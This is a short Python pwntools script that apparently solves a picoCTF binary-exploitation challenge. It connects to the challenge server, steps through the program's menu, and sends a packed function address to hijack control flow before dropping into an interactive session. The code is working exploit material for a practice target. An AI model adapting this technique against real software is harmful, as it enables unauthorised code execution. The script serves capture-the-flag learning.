from pwn import *


#r = process("./vuln")
r = remote("mercury.picoctf.net", 4504)
#pause()

hahaexploitgobrrr = p32(0x80487d6)
#r.sendline(b"S") # Get the memory leak

#for i in range(9):
#    try:
#        inp = str(r.recvline()[21:].strip())[2:].strip("'") # Get the address from the leak
#    except:
#        log.info("")
#r.recvuntil(b"(e)xit\n")
r.sendline(b"i")
#r.recvuntil(b"(Y/N)?\n")
r.sendline(b"y")
#r.recvuntil(b"(e)xit\n")
r.sendline(b"l")
#r.recvuntil(b"try anyways:\n")

time.sleep(1)

pld = hahaexploitgobrrr
#pld += b"A"*(8-len(hahaexploitgobrrr))
#########time.sleep(1)
r.sendline(pld + p32(0))
#r.recvuntil(b"(e)xit")

#r.recvuntil(b"(Y/N)?\n")

#r.recvuntil(b"(e)xit")
#print (r.recvall())
r.interactive()